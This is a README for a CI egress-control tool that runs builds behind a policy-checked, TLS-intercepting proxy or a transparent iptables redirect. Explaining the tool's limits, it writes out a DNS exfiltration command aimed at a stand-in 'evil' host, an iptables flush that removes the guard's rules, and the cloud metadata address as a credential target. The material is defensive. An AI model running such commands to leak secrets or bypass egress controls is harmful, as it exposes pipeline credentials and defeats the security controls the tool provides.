# deter-guard

Egress control for CI. Fetches your organization's signed policy, verifies it, and runs your build
behind a filtering proxy — so a blocklisted package is never downloaded.

```
ghcr.io/incubits/deter-guard
```

One static Go binary in a ~6 MB `scratch` image. No shell, no package manager, no runtime, no
dependencies (`go.mod` has no `require` block).

---

## Quick start

### GitHub Actions

Add one step. Everything after it is guarded — no prefixes, no environment to wire up, no teardown.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write   # required — without it GitHub won't mint an OIDC token
      packages: read
    steps:
      - uses: actions/checkout@v5
      - uses: incubits/deter-guard@v1
        with:
          console: ${{ vars.DETER_CONSOLE_URL }}
          pubkey: ${{ vars.DETER_POLICY_PUBKEY }}

      - run: pnpm install --frozen-lockfile   # guarded
      - run: pnpm build                       # guarded
```

The action pulls the guard, verifies its build provenance, starts it, and shuts it down cleanly at
the end of the job (pass, fail, or cancel) so the refusal report is flushed and refused hosts show up
as annotations on the run summary.

> **First time?** Claim your GitHub organization in the console under
> **CI protection → Trusted CI owners**. Until you do, the OIDC exchange is refused by design.

### One command, anywhere

```bash
deter-guard exec -- npm ci
```

```
deter-guard: policy version 812 verified against pinned key a092bf20…1b26d0f8
deter-guard: egress proxy on http://127.0.0.1:52054 · 4 rule(s), 118 block(s)
deter-guard: DENY  GET registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz — on your blocklist
npm error 403 Forbidden - GET https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz
```

### Action inputs

| Input | Default | |
| --- | --- | --- |
| `console` | — | Console base URL. Required unless `policy` is set. |
| `pubkey` | — | Pin the policy signing key (hex). **Strongly recommended.** |
| `transparent` | `false` | Intercept at the kernel instead of via proxy variables. See [Modes](#modes). |
| `policy` | — | Local **unsigned** policy file to enforce instead of fetching one. |
| `image` | matches the action's own ref | Image to take the binary from. Set it only to pull from a mirror of your own — see [Versions](#versions). |
| `verify-attestation` | `true` | Verify the image's build provenance before using it. |
| `verbose` | `false` | Log allowed requests too, not just refusals. |
| `project` / `run-id` | — | For `dtrc_` tokens. Ignored when OIDC is available. |

### Versions

The action and the image are one release, cut from one commit. **Pinning the action pins the binary
it runs** — the default `image` is derived from the ref you wrote after the `@`, so there is no
floating tag hiding behind a version number.

| You write | You get | |
| --- | --- | --- |
| `@v1` | newest 1.x | Fixes and features arrive on their own. Nothing breaking. |
| `@v1.4` | newest 1.4.x | Patches only. |
| `@v1.4.2` | exactly that | Reproducible. Update it deliberately. |
| `@<commit sha>` | exactly that | The strongest pin. Resolves to the `sha-<short>` image. |
| `@main` | tip of trunk | Untagged and unreleased. For trying something out. |

Image tags follow the same shape, plus `:latest`, which is the **newest release** — not the tip of
`main`, which is `:main`:

```
ghcr.io/incubits/deter-guard:1        # newest 1.x
ghcr.io/incubits/deter-guard:1.4.2    # exactly that
ghcr.io/incubits/deter-guard@sha256:… # a digest, from the release notes
```

Versions are semver, and the major number is a promise about the action inputs, the CLI flags and
the environment variables — the surfaces you have written down somewhere. Every release is a
[GitHub release](https://github.com/incubits/deter-guard/releases) with generated notes and the
image digest.

---

## How it works

The guard decides at two points:

| | Decided on |
| --- | --- |
| `CONNECT host:443` | host only — a tunnel has no method or path yet |
| every request inside it | host + method + **path**, after TLS is terminated |

**This is why a blocklist can name a package version.** `registry.npmjs.org` stays reachable while
one compromised tarball does not. Deciding only at the tunnel can't do that — a rule scoped to
`/v1/*` has nothing to match at CONNECT time, so either the whole host is refused or the rule
silently does nothing.

Matching on the path needs TLS interception, so a CA is generated in memory per run, written only
where the build is told to trust it, and dies with the job.

---

## Modes

| | Proxy mode | Transparent mode |
| --- | --- | --- |
| Command | `exec`, `serve` | `serve --transparent --redirect --install-ca` |
| How the build is pointed at it | `HTTPS_PROXY` and friends | kernel redirects :80/:443 |
| Requires | nothing | Linux + root |
| Can a process opt out? | **yes** | no |

### Proxy mode (default)

Environment variables are a *request*. npm, pip, curl, and git honour them; a malicious `postinstall`
that opens its own socket does not, and neither does Node's built-in `fetch` unless
`NODE_USE_ENV_PROXY=1` is set.

That matters less than it sounds, because the proxy sits where packages are **fetched** — a blocked
package is never downloaded, so its install script never runs. But it is *filtering*, not
containment, and shouldn't be described to an auditor as containment.

### Transparent mode

```bash
deter-guard serve --transparent --redirect --install-ca
```

The kernel redirects outbound 80 and 443 to the guard before any process gets a say, the CA goes into
the system trust store, and the destination is read from the traffic itself (TLS SNI, or the `Host`
header on port 80). Nothing can opt out. A connection with no SNI can't be identified, so it's
refused — default deny covers "I can't tell what this is" as well as "I know, and no".

On GitHub Actions, set `transparent: true`; hosted runners provide the passwordless sudo it needs.

Two things to know before turning it on:

- **Your runner's control plane is permitted automatically.** A policy that forgot `github.com`
  wouldn't just fail the build — it would stop the runner reporting that it had, and the job would
  die mute. Those hosts are listed at startup; `--no-ci-hosts` enforces the policy against them too.
- **Everything on the machine trusts a CA we minted, for the length of the job.** It's generated in
  memory, lasts 24 hours, exists on disk only in the file we install, and is removed on exit. Fair
  on an ephemeral runner, bad on a shared workstation.

Node ships its own roots and ignores the system trust store, so `NODE_EXTRA_CA_CERTS` is set even
here. `deter-guard env` covers it.

---

## Pin the public key

`DETER_POLICY_PUBKEY` is the difference between a real check and a decorative one.

Without it the guard still verifies the signature — but against the key **the server just handed it**,
which only proves the bundle agrees with itself. Anything able to serve the bundle can serve a
matching key. The guard says so on every run:

```
deter-guard: key was NOT pinned — this proves the bundle is self-consistent, not that it came
from you. Set DETER_POLICY_PUBKEY to make this a real check.
```

Get it from **Connect → Key fingerprint**, or `curl https://<distribution-host>/egress-policy.pub`.
It's a public key — commit it, put it in a CI variable, print it in logs.

---

## Other CI systems

### GitLab CI

GitLab requires the job to *declare* its ID token, so pass it as `DETER_ID_TOKEN`:

```yaml
policy:
  image: ghcr.io/incubits/deter-guard:1
  id_tokens:
    DETER_ID_TOKEN: { aud: "deter-console" }
  variables:
    DETER_CONSOLE_URL: https://console.example.com
  script:
    - deter-guard policy --out egress.cedar
```

### Jenkins, on-prem, air-gapped

Mint a CI token in the console under **CI protection → CI tokens**:

```bash
docker run --rm \
  -e DETER_CONSOLE_URL=https://console.example.com \
  -e DETER_CI_TOKEN="$DETER_CI_TOKEN" \
  -e DETER_POLICY_PUBKEY="$DETER_POLICY_PUBKEY" \
  -v "$PWD:/workspace" \
  ghcr.io/incubits/deter-guard:1 \
  policy --project "$JOB_NAME" --run "$BUILD_TAG" --out /workspace/egress.cedar
```

For a `dtrc_` token, `--project` attributes usage and `--run` is the idempotency key, so a retried
job isn't counted twice. An OIDC session carries both already.

<details>
<summary><b>Running the guard by hand on GitHub Actions</b></summary>

```yaml
      - run: |
          deter-guard serve --detach --state-dir "$RUNNER_TEMP/deter"
          deter-guard env --state-dir "$RUNNER_TEMP/deter" --format github >> "$GITHUB_ENV"
        env:
          DETER_CONSOLE_URL: ${{ vars.DETER_CONSOLE_URL }}
          DETER_POLICY_PUBKEY: ${{ vars.DETER_POLICY_PUBKEY }}
```

Two things the action does that you now have to do yourself:

1. Add an `if: always()` step that SIGTERMs the guard. Refusals flush on `SIGTERM`, so a guard the
   runner simply reaps enforces perfectly and reports **nothing** — you keep enforcement and silently
   lose the audit trail, with an identical-looking build result.
2. Set `NODE_USE_ENV_PROXY=1`, or corepack downloads your package manager around the proxy.

</details>

---

## CLI reference

| Command | |
| --- | --- |
| `deter-guard claim` | Finish claiming an organization: prove to the console who owns this pipeline. Fails unless the platform itself signed the identity. |
| `deter-guard whoami` | What this pipeline authenticates as. Run it first when something's wrong. |
| `deter-guard policy` | Fetch, verify, and write the Cedar policy. `--out <path>`, or stdout. |
| `deter-guard exec -- <cmd>` | Run `<cmd>` behind the proxy. Exit code passes straight through. |
| `deter-guard serve` | Run the proxy on its own, so many commands sit behind one. |
| `deter-guard env` | Print the variables that point a build at a running proxy. |

`--json` on `claim`, `whoami` and `policy` for machine-readable output.

<details>
<summary><b>Options</b></summary>

**`exec` and `serve`**

| | |
| --- | --- |
| `--policy <path>` | Enforce a local policy file instead of fetching one. **Unsigned** — nothing is verified, and it says so on every run. |
| `--state-dir <dir>` | Where the CA the build must trust is written. Defaults to a temp dir. |
| `--verbose` | Log allowed requests too, not just refusals. |

**`serve`**

| | |
| --- | --- |
| `--addr <ip>` | Listen address. Default `127.0.0.1`. Anything else is warned about loudly. |
| `--port <n>` | Listen port. Default `3128`; `0` lets the kernel pick. |
| `--ca-out <path>` | Write the CA here and leave it there on exit. |
| `--ready-file <p>` | Write the proxy URL here once the socket is actually accepting. |
| `--detach` | Background the proxy; return only once it is up. |
| `--wrap` | Run one command on a fixed port, then shut down. |

**`serve --transparent`** (Linux, root)

| | |
| --- | --- |
| `--redirect` | Install the `iptables` rules that send outbound :80/:443 here. |
| `--install-ca` | Trust the guard's CA system-wide, so intercepted TLS verifies. |
| `--no-ci-hosts` | Also enforce the policy against this runner's own control plane. |
| `--run-as <user>` | Run the `--wrap` command as this user, so it cannot undo the redirect. `user`, `uid`, or `user:group`. |
| `--exempt <cidrs>` | Comma-separated CIDRs never to intercept. IPv4 and IPv6 both. |
| `--transparent-http-port <n>` / `--transparent-tls-port <n>` | Default `3129` / `3130`. |

Transparent mode covers **IPv4 and IPv6**. An IPv4-only chain is not partial coverage on a
dual-stack runner — any host with a `AAAA` record is reached over IPv6 and never touches a rule the
guard wrote. If this host has routable IPv6 and the `ip6tables` chain cannot be installed, the guard
**refuses to start** rather than enforce a policy with a silent hole in it.

The **cloud metadata service is filtered like any other host.** `169.254.169.254` serves instance
credentials over plain HTTP, which makes it the highest-value destination on a CI runner and exactly
the one an egress policy should have an opinion about, so it is subject to default deny. A runner
that genuinely needs it either permits it in policy or passes
`--exempt 169.254.169.254/32`.

**`env`**

| | |
| --- | --- |
| `--format <fmt>` | `sh` (default), `github`, `docker`, `json`. |
| `--proxy <url>`, `--ca <path>` | Override. By default both are read from the running guard's state file. |
| `--unset` | Emit lines that *clear* the variables instead of setting them. |

</details>

### Why `deter-guard env` exists

The build is pointed at the proxy through fourteen variables across seven ecosystems: `HTTP_PROXY`
and friends, plus `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`, `PIP_CERT`, `CURL_CA_BUNDLE`,
`GIT_SSL_CAINFO`, `SSL_CERT_FILE`, and `CARGO_HTTP_CAINFO`. Missing one shows up as an inscrutable
certificate error deep inside a package manager. `env` prints the current list, so a copy in your
repo can't go stale:

```bash
eval "$(deter-guard env)"                      # this shell and everything it starts
deter-guard env --format github >> "$GITHUB_ENV"
deter-guard env --format docker                # paste into a Dockerfile
eval "$(deter-guard env --unset)"              # put the shell back
```

---

## What a refusal looks like

A real HTTP **403**, delivered inside the TLS session, naming the host and policy version:

```json
{
  "error": "egress_refused",
  "decision": "deny_policy",
  "host": "registry.npmjs.org",
  "reason": "host not permitted by the egress policy",
  "policy_version": 1787493039,
  "fix": "permit this host in the deter console, under your organization's egress policy"
}
```

Nothing is sent to the refused host — the tunnel is terminated here and never dialled onward.

**The status code is the point.** Refusing at `CONNECT` instead gives the client a *transport* error
(`UND_ERR_ABORTED`), and every package manager retries those — so a refusal decided in the first
millisecond would be retried with backoff for minutes against a host that will never answer. None of
them retry a 4xx. A `pnpm install` against a refused registry fails in **one second** with
`ERR_PNPM_FETCH_403`, without you turning retries off in your own pipeline.

> pnpm reacts to any 403 by printing your registry auth settings, so its output mentions
> authorization even though the refusal has nothing to do with credentials. The guard's own `DENY`
> line appears directly above it and says what actually happened.

---

## Adding the guard to your own image

One `COPY`. The binary is static and carries its own root certificates, so it needs no CA bundle,
libc, or anything else from the image it lands in:

```dockerfile
COPY --from=ghcr.io/incubits/deter-guard:1 /deter-guard /usr/local/bin/deter-guard
```

There are four ways to put it in front of a build, differing in how hard it is for the build to get
around:

| | | Build can bypass it? |
| --- | --- | --- |
| 1 | Wrap each command — `exec` | yes, by not using the proxy |
| 2 | One proxy, many commands — `serve` | yes, by ignoring the variables |
| 3 | A sidecar that owns the network | no, if it has no other route |
| 4 | `--transparent --run-as <user>` in one container | no |
| 4b | `--transparent` with a root build | **yes** — the build can flush the rules |

**Shapes 1 and 2 are filtering, not containment** — don't describe them to an auditor as
containment. Shape 4 is usually the right answer: it gets shape 3's property inside a single
container, at the cost of needing Linux and root.

**Shape 4 is only containment if the build is unprivileged.** The redirect is enforced by the
kernel, which enforces it against everyone except a process holding `CAP_NET_ADMIN` — and a build
running as root in that container holds it, so `iptables -t nat -F DETER_GUARD` is all it takes.
`serve --wrap --run-as <user> -- <command>` starts the guard as root and the build as somebody else:
the build inherits the network namespace, so the rules apply to it, but not the capability, so it
cannot remove them. That drop *is* the control. Without `--run-as` the guard says so at startup
rather than implying a containment it is not providing.

<details>
<summary><b>All four, with Dockerfiles</b></summary>

### 1. Wrap each command — `exec`

```dockerfile
FROM node:22-slim
COPY --from=ghcr.io/incubits/deter-guard:1 /deter-guard /usr/local/bin/deter-guard
RUN deter-guard exec -- npm ci
```

Simplest, scoped to exactly the command you name. Costs a prefix on every line.

### 2. One proxy, many commands — `serve`

For a developer image where people run whatever they like, put the guard at PID 1 and let everything
inherit it:

```dockerfile
FROM node:22-slim
COPY --from=ghcr.io/incubits/deter-guard:1 /deter-guard /usr/local/bin/deter-guard

# A FIXED port and CA path, so these can be baked in — which is what makes
# `docker exec` into a running container covered too, not just the CMD.
ENV DETER_GUARD_PORT=3128 DETER_GUARD_CA_OUT=/etc/deter/ca.pem

# Paste the generated ENV block here (see below).

ENTRYPOINT ["deter-guard", "serve", "--wrap", "--"]
CMD ["bash"]
```

Generate that block rather than copying one from here — the variable list grows, and a stale copy
fails as a certificate error deep inside a package manager rather than as a configuration problem.
There's no running guard at image-build time, so name the port and CA path explicitly:

```bash
deter-guard env --format docker \
  --proxy http://127.0.0.1:3128 --ca /etc/deter/ca.pem
```

The same idea in CI without a container:

```yaml
- run: deter-guard serve --detach
- run: deter-guard env --format github >> "$GITHUB_ENV"
- run: pnpm install --frozen-lockfile
- run: pnpm build
- run: pkill -TERM deter-guard || true   # lets it flush its report
  if: always()
```

Shut it down rather than letting the job reap it — refusals flush on `SIGTERM`.

### 3. A sidecar that owns the network

Run the guard in its own container and give the build container no route out except through it
(`network_mode: service:guard` in Compose, or one Pod with two containers). The build can't stop the
proxy, rewrite its rules, or unset its way around it, because none of it is in its container.

```yaml
services:
  guard:
    image: ghcr.io/incubits/deter-guard:1
    command: ["serve", "--addr", "0.0.0.0", "--port", "3128", "--ca-out", "/shared/ca.pem"]
    volumes: ["shared:/shared"]
  build:
    image: your-build-image
    network_mode: "service:guard"
    volumes: ["shared:/shared"]
```

`--addr 0.0.0.0` publishes an intercepting proxy with no authentication, so the guard warns every
time. Publish it to one build's network, never a shared one.

### 4. Transparent

Add `--transparent --redirect --install-ca` to shape 2. The kernel redirects traffic before any
process is consulted, so nothing can opt out — shape 3's property without a second container. See
[Modes](#modes).

</details>

---

## Configuration

| Env | Flag | |
| --- | --- | --- |
| `DETER_CONSOLE_URL` | `--console` | Console base URL. Required. |
| `DETER_POLICY_PUBKEY` | `--pubkey` | Pin the signing key. Strongly recommended. |
| `DETER_ID_TOKEN` | | An OIDC ID token you supply (GitLab and friends). |
| `DETER_CI_TOKEN` | | A long-lived `dtrc_` token. Fallback only. |
| `DETER_CI_OIDC_AUDIENCE` | `--audience` | Default `deter-console`. Must match the console. |
| `DETER_PROJECT` | `--project` | Project id, for a `dtrc_` token. |
| `DETER_RUN_ID` | `--run` | Run id — deduplicates usage across retries. |
| `DETER_POLICY_FILE` | `--policy` | Enforce a local, **unsigned** policy file. |
| `DETER_STATE_DIR` | `--state-dir` | Where the CA and state file go. |
| `DETER_GUARD_ADDR` | `--addr` | `serve` listen address. Default `127.0.0.1`. |
| `DETER_GUARD_PORT` | `--port` | `serve` listen port. Default `3128`. |
| `DETER_GUARD_CA_OUT` | `--ca-out` | Where `serve` writes the CA, and leaves it. |
| `DETER_RUN_AS` | `--run-as` | Run the `--wrap` command as this user. Transparent mode's containment depends on it. |
| `DETER_GUARD_ROOTS` | | Roots for the guard's *own* TLS: `both` (default), `system`, `embedded`. |

**Credentials are tried in order:** `DETER_ID_TOKEN` → GitHub Actions OIDC → `DETER_CI_TOKEN`. If the
OIDC exchange is *rejected* (wrong audience, owner not claimed) the guard does **not** fall back to a
`dtrc_` token — that would hide a real misconfiguration behind a different credential.

**`DETER_GUARD_ROOTS`** controls only the guard's own outbound TLS, never what the build may reach.
The binary embeds Mozilla's root set so copying it into a slim image with no CA bundle doesn't
silently break it. The default `both` unions those with the host's store — so a root the host
deliberately distrusted stays trusted here until the guard is rebuilt. Use `system` to honour only
the host's trust decisions, or `embedded` for a set that doesn't vary with the base image.

## Exit codes

Distinct on purpose — a pipeline shouldn't have to grep stderr.

| Code | Meaning |
| --- | --- |
| `0` | Fine. |
| `1` | Usage or configuration problem. |
| `2` | **The policy did not verify.** Nothing was written. Treat as a compromised distribution path until proven otherwise. |
| `3` | Authentication or authorization failed — including being over a plan limit (the message names the meter). |

---

## Verify the image

Built by GitHub Actions with a provenance attestation:

```bash
gh attestation verify oci://ghcr.io/incubits/deter-guard:1 --repo incubits/deter-guard
```

Pin `sha-<commit>`, or the digest from the release notes, for an immutable reference. See
[Versions](#versions).

> **Maintainers:** a GHCR package published by Actions starts **private**, even from a public
> repository — it does not inherit repo visibility. Until it's switched, an anonymous `docker pull`
> gets a `401`. Flip it once, in
> [Packages → deter-guard → Package settings → Change visibility](https://github.com/orgs/incubits/packages/container/deter-guard/settings).

## Not here yet

- **DNS policy.** Transparent mode redirects TCP 80 and 443, so a build can't reach a refused host
  over HTTP — but it can still resolve names, and a resolver is a channel. Nothing stops
  `dig $(base64 secret).evil.example.com` today.
- **Ports other than 80 and 443.** A registry on :8443, `git+ssh`, or anything speaking its own
  protocol goes past the redirect. The rules are two lines; knowing what to do with the traffic once
  it arrives is not.
- **Certificate pinning.** Anything that pins a certificate breaks under interception by design.
  There's no way to filter it, and no allowlist for tunnelling it through uninspected yet.
- **A blocklist feed.** The client already enforces `blocked` entries and the console serves the
  field, but nothing populates it yet. Once a feed lands, every job picks it up on its next run with
  no change here.

## Development

```bash
go test ./...
go vet ./...
node --test action/inputs.test.js  # the action is JavaScript; `go test` never sees it
node --test ci/semantic.test.js    # the naming and version rules
go build -o deter-guard .          # local binary
docker build -t deter-guard:dev .  # the scratch image
```

Go cross-compiles, so the multi-arch image needs no QEMU: the Dockerfile runs the compiler natively
on the builder and targets each platform via `GOOS`/`GOARCH`. An arm64 image costs seconds rather
than minutes of emulation.

### Branches, commits, releases

Branches are `type/short-slug` and commit subjects are
[Conventional Commits](https://www.conventionalcommits.org) with the description left as prose —
`feat(proxy)!: Decide on the same request you send`. Both are enforced in CI, and both exist to serve
one thing: releasing is editing `VERSION`, and the types are how CI checks the number you chose is
big enough for everything unreleased. A `feat` that has landed cannot ship as a patch.

The rules, the types, and how to cut a release are in [CONTRIBUTING.md](CONTRIBUTING.md); they live
in code as [`ci/semantic.js`](ci/semantic.js).

Nothing here depends on the console's source. The verifier is a deliberate re-implementation — a CI
runner shouldn't pull in a web framework and a database driver to check a signature — and a test pins
the signed-payload format against a vector produced by the console's own signer, which the broker's
Rust verifier is also pinned against. Three implementations, one signature.
